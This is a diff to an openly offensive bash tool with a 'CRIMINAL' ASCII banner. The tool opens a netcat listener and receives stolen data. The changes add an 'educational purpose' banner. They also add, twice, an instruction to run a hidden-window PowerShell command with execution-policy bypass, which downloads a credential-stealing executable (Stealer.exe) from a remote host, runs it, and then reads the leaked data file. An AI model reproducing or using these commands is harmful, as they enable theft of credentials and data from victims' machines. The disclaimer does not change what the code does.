@@ -8,6 +8,7 @@ printf "\e[1;31m██║     ██████╔╝██║██╔██�
 printf "\e[1;31m██║     ██╔══██╗██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     \e[0m\n"
 printf "\e[1;31m╚██████╗██║  ██║██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗\e[0m\n"
 printf "\e[1;31m ╚═════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝\e[0m\n"
+printf "\e\n[1;93mStrictly For Educational Purpose.\e[0m\n"
 
 command -v pwsh > /dev/null 2>&1 || { printf >&2 "\e[1;93mI require pwsh but it's not installed.Install it.Aborting.\napt install pwsh -y\n\e[0m"; exit 1; }
 command -v nc > /dev/null 2>&1 || { printf >&2 "\e[1;93mI require netcat but it's not installed.Install it.Aborting.\napt install netcat -y\n\e[0m"; exit 1; }
@@ -26,7 +27,8 @@ then
 read -p $'\e\n[1;93mEnter The Port: \e[0m' port
 echo""
 printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
-printf "\n\e[1;93mWait For 1 min And Type The Command Below\e[0m"
+printf '''\n\e[1;32mType: \e[0m\e[1;93mpowershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe\e[0m'''
+printf "\e\n[1;32mType: \e[0m\e[1;93mStart Stealer.exe \e[0m\n"
 printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n"
 nc -klvp $port
 sleep 1
@@ -57,7 +59,8 @@ read -p $'\n\e[1;96m Did You Need To Listen???[Y/N] : \e[0m' Option
 	if [[ $Option == Y || $Option == y ]]
 	then
 	printf "\e\n[1;93mListening... On Port\e[0m\e[1;31m $port \e[0m\n"
-	printf "\n\e[1;93mWait For 1 min And Type The Command Below\e[0m"
+	printf '''\n\e[1;32mType: \e[0m\e[1;93mpowershell -executionpolicy bypass -windowstyle hidden wget -o Stealer.exe "https://github.com/r00t-3xp10it/meterpeter/raw/master/mimiRatz/DarkRCovery.exe\e[0m'''
+	printf "\e\n[1;32mType: \e[0m\e[1;93mStart Stealer.exe \e[0m\n"
 	printf "\e\n[1;32mType: \e[0m\e[1;93mcat Leaked.txt \e[0m\n"
 	nc -klvp $port
 	sleep 1
